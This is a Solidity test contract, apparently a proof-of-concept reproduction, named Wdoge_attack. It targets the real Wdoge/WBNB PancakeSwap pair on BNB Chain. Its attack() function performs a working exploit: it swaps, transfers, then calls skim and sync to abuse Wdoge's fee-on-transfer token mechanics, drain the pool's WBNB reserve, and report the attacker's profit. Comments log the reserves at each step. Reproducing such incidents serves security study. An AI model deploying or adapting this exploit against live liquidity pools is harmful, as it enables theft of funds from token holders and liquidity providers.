// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
import "ds-test/test.sol";
import "./interface.sol";

contract Wdoge_attack is DSTest {

    IWBNB  wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 busd  = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 wdoge  = IERC20(0x46bA8a59f4863Bd20a066Fd985B163235425B5F9);
    address public wdoge_wbnb = 0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d;
    IPancakePair wdoge_wbnb_pair = IPancakePair(wdoge_wbnb);

    string str1;
    string str2;
    string str3;
    string str4;

    string str89;
    string str90;
    string str91;
    string str92;
    string str93;

    uint112 WdogeReserve;
    uint112 WbnbReserve;
    uint WdogeInput;
    uint WBNBInput;
    uint WBNBIn;
    uint WdogeIn;

    constructor() payable public {
        require(msg.value == 3000 * 10 ** 18, "loan amount does not match");
        wbnb.deposit{value: 3000 * 10 ** 18}();
    }


    function attack() public {
        
        // Wdoge Reserve: 7102767012379398034561708289684 
        // Wbnb Reserve: 78658352619485714640

        // Action 1: SwapWBNB2Wdoge:   WBNB --> Wdoge   State: PancakePair
        //                           State: PancakePair

        // str1 = PancakePairSummary();
        // uint WdogeGot = wdoge.balanceOf(address(this));

        WBNBIn = 2900 ether;
        wbnb.transfer(wdoge_wbnb, WBNBIn);
        (WdogeReserve, WbnbReserve, ) = wdoge_wbnb_pair.getReserves();
        WdogeInput = 997 * WBNBIn * WdogeReserve / (1000 * WbnbReserve + 997 * WBNBIn) * 100 / 104;
        wdoge_wbnb_pair.swap(WdogeInput, 0, address(this), "");

        // WdogeGot = (wdoge.balanceOf(address(this)) - WdogeGot ) / 1e24;        
        // str2 = PancakePairSummary();
        // revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(WdogeGot))));

        // Wdoge Reserve: 7102767 Wbnb Reserve: 78 
        // Wdoge Balance: 7102767 Wbnb Balance: 78 
        // Wdoge Reserve: 188114 Wbnb Reserve: 2978 
        // Wdoge Balance: 188114 Wbnb Balance: 2978 
        // 5983833



        // Action 2: TransferWdoge:  Wdoge --> None    State: PancakePair
        //                           State: PancakePair

        // str1 = PancakePairSummary();
        
        wdoge.transfer(wdoge_wbnb, 5224718 * 1e24   );
        
        // str2 = PancakePairSummary();
        // revert(appendWithSpace(str1, str2));

        // Wdoge Reserve: 188114 Wbnb Reserve: 2978 
        // Wdoge Balance: 188114 Wbnb Balance: 2978
        // Wdoge Reserve: 188114 Wbnb Reserve: 2978 
        // Wdoge Balance: 4890360 Wbnb Balance: 2978



        // Action 3: PancakePairSkim: None --> Wdoge    State: PancakePair
        //                           State: PancakePair
        // str1 = PancakePairSummary();
        // uint WdogeGot = wdoge.balanceOf(address(this));
        wdoge_wbnb_pair.skim(address(this));     // When Wdoge.transfer is called, 4% of amount will be burnt from your wallet after the transfer
                                                 // A transfer x to B
                                                 // A lost x + 4% of x
                                                 // B gets 90% of x, the dev gets 1% of x, fee wallet gets 1 % of x, 4% of x is redistributed
        // WdogeGot = ( wdoge.balanceOf(address(this)) - WdogeGot ) / 1e24;
        // str2 = PancakePairSummary();
        // revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(WdogeGot))));

        // Wdoge Reserve: 188114 Wbnb Reserve: 2978 
        // Wdoge Balance: 4890360 Wbnb Balance: 2978 
        // Wdoge Reserve: 188114 Wbnb Reserve: 2978 
        // Wdoge Balance: 24 Wbnb Balance: 2978
        // 4232021



        // Action 4: PancakePairSync:   WBNB --> Wdoge   State: PancakePair  
        //                           State: PancakePair   

        // str1 = PancakePairSummary();   

        wdoge_wbnb_pair.sync();
        
        // str2 = PancakePairSummary();
        // revert(appendWithSpace(str1, str2));

        // Wdoge Reserve: 188114 Wbnb Reserve: 2978 
        // Wdoge Balance: 24 Wbnb Balance: 2978 
        // Wdoge Reserve: 24 Wbnb Reserve: 2978 
        // Wdoge Balance: 24 Wbnb Balance: 2978
        


        // Action 5: SwapWdoge2WBNB:   Wdoge --> WBNB   State: PancakePair
        //                           State: PancakePair
        // str1 = PancakePairSummary();   
        // uint WBNBGot = wbnb.balanceOf(address(this));

        WdogeIn = 4466647 * 1e24;
        wdoge.transfer(wdoge_wbnb, WdogeIn);
        (WdogeReserve, WbnbReserve, ) = wdoge_wbnb_pair.getReserves();
        WdogeIn = WdogeIn * 9 /10;
        WBNBInput = 997 * WdogeIn * WbnbReserve / (1000 * WdogeReserve + 997 * WdogeIn);
        IPancakePair(wdoge_wbnb).swap(0, WBNBInput, address(this), "");
        
        // WBNBGot = (wbnb.balanceOf(address(this)) - WBNBGot ) / 1e18;
        // str2 = PancakePairSummary();
        // revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(WBNBGot))));

        // Wdoge Reserve: 24 Wbnb Reserve: 2978 
        // Wdoge Balance: 24 Wbnb Balance: 2978 
        // Wdoge Reserve: 4109340 Wbnb Reserve: 0 
        // Wdoge Balance: 4109340 Wbnb Balance: 0 
        // 2978

        revert(ProfitSummary());
    }

    function ProfitSummary() public view returns (string memory) {
        return append("WBNB balance of attacker: ", uint2str(wbnb.balanceOf(address(this))/1e18));
    }

    function PancakePairSummary() public returns (string memory) {
        (WdogeReserve, WbnbReserve, ) = wdoge_wbnb_pair.getReserves();
        uint WdogeBalance = wdoge.balanceOf(wdoge_wbnb);
        uint WbnbBalance = wbnb.balanceOf(wdoge_wbnb);
        str89 = append("Wdoge Reserve: ", uint2str(WdogeReserve / 1e24));
        str90 = append("Wbnb Reserve: ", uint2str(WbnbReserve / 1e18));
        str91 = append("Wdoge Balance: ", uint2str(WdogeBalance / 1e24));
        str92 = append("Wbnb Balance: ", uint2str(WbnbBalance / 1e18));
        return appendWithSpace(appendWithSpace(str89, str90), appendWithSpace(str91, str92));
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }


}
